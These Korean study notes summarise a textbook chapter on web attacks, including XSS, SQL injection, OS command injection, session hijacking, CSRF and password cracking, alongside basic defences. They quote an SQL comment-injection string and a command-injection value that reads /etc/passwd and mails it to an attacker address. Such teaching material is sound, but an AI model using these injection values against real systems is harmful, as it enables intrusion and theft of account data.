---
title: 그림으로 배우는 HTTP 스터디 5
date: 2020-02-21
tag: [Study]
---

## "그림으로 배우는 HTTP" 스터디 5

### 11장: 웹 공격 기술

#### 크로스 사이트 스크립팅(XSS)

- 크로스 사이트 스트립팅은 취약성이 있는 웹 사이트를 방문한 사용자의 브라우저에서 부정한 HTML 태그나, JavaScript 등을 공격자가 악의적으로 동작시키는 공격이다.

#### SQL Injection

- 먼저 SQL이란, 관계형 데이터베이스 관리 시스템에 대해서 조작하는 데이터베이스 언어이다. 그리고 SQL 인젝션은 이 언어를 이용하여 웹 애플리케이션을 이용하고 있는 데이터베이스에 SQL을 부정하게 실행하는 공격을 말한다. 예를들면,  
  `SELECT * FROM bookTBl WHERE author='우에노 센'--' and flag=1;`에서 인젝션이 발생하는 원인은, '--' 문자의 삽입이다. 이로 인해서 뒤에 오는 내용은 주석처리가 되고 `flag=1` 조건은 실행되지 않는다.

#### OS Command Injection

- OS 커맨드 인젝션이란 웹 애플리케이션을 경유하여 OS 명령을 부정하게 실행하는 공격을 말한다. 예를 들면,

  ``` javascript
  my $adr = $q -> param('mailaddress');
  open(MAIL, "| /usr/sbin/sendmail $adr");
  print MAIL "From: info@example.com\n"
  ```

- 위와 같은 스크립트에서 공격자가 메일 주소 값 $adr에 `; cat /etc/passwd | mail hack@example.jp`를 보낸다면,  
  첫번째 ';'세미콜론으로 인해 복수의 커맨드가 실행된다. 즉, sendmail 커맨드가 먼저 실행되고, 뒤이어 `cat /etc/passwd | mail hack@example.jp`가 실행된다. 결과적으로 `/etc/passwd`라는 리눅스 계정 정보가 포함된 파일이 `hack@example.jp` 메일로 송신된다.

#### HTTP 헤더 Injection

- HTTP 헤더 인젝션이란 공격자가 리스폰스 헤더 필드에 개행 문자 등을 삽입함으로써 임의의 리스폰스 헤더 필드나 바디를 추가하는 수동적 공격을 말한다.

#### 부적절한 에러 메세지

- "아이디가 등록되어 있지 않습니다" 혹은 "비밀번호가 틀립니다"와 같은 에러 메세지에는 문제가 있다. 왜냐하면 이를 통해서 공격자가 "음! 아이디가 등록되어 있지 않으니 아이디를 바꿔서 다시 시도해봐야겠군!" 혹은 "음! 비밀번호가 틀렸다는 말은 아이디는 존재한다는 의미로군!"과 같이 유익한 정보를 얻을 수 있기 때문이다.  
  그렇기 때문에 "아이디 혹은 비밀번호를 다시 확인해주세요"와 같이 별다른 정보를 얻을 수 없도록 에러메세지를 작성해야 한다.

#### 세션 하이잭

- 세션 하이잭은 공격자가 어떠한 방법으로 유저의 세션 ID를 탈취해서 악용하는 것으로, 공격자가 유저인 것처럼 위장하여 공격하는 것을 말한다. 이런 세션 하이잭의 예시로는, 공격자가 크로스 사이트 스크립팅을 통해 `documment.cookie`라는 JavaScript 코드를 사용하여 세션 ID를 포함한 쿠키를 탈취할 위험이 있다. 이와 같이 XSS를 이용한 세션 하이잭을 막기 위해서는 쿠키의 속성으로 `HttpOnly` 속성을 지정해주면 된다.

#### 크로스 사이트 리퀘스트 포저리(CSRF)

- 크로스 사이트 리퀘스트 포저리란, 인증된 유저가 의도하지 않은 개인정보나 설정정보 등을 공격자가 설치해 둔 함정에 의해 어떤 상태를 갱신하는 처리를 강제로 실행시키는 공격으로 수동적 공격이다. 유저의 자동로그인과 같이 "인증된 상태"를 이용해서 그 브라우저를 통해 서버에 무엇인가 call을 요청함으로써 원하는 정보를 취득하거나 이득을 보는 공격이다.

#### 패스워드 크래킹

- **무차별 대입 공격** : 비밀번호 시스템에서 취할 수 있는 모든 경우의 수를 무차별적으로 다 때려박는 방식이다. 시간이 얼마가 걸리든 언젠가는 통과한다.  
- **사전 공격** : 무차별적으로 다 때려박는 게 아니라 사전에 사용자들이 비밀번호로 입력할만한 후보들을 추려서 대입해보는 방식이다. 만약 풀릴경우 무차별 대입 공격보다 훨씬 효율적이지만 아예 통과 못할 수도 있다.  
- **레인보우 테이블** : 레인보우 테이블은 평문과 그에 대응하는 해시 값으로 구성된 데이터베이스 테이블로, 사전에 이 테이블을 준비한 후 무차별 대입 공격이나 사전 공격시에 레인보우 테이블에서 해시 값을 검색해서 이에 맞는 평문을 이끌어 냄으로써 시간을 단축할 수 있다.

#### DDOS

- 먼저 DOS란, 타겟 서버에 대량의 엑세스를 집중시킴으로써 부하를 걸어 서버의 리소스를 다 소비하게 해서 사실상 서비스 정지상태로 만드는 공격을 말한다. 그리고 이 공격을 여러 대의 컴퓨터로 수행하는 것을 DDOS 공격이라고 한다.

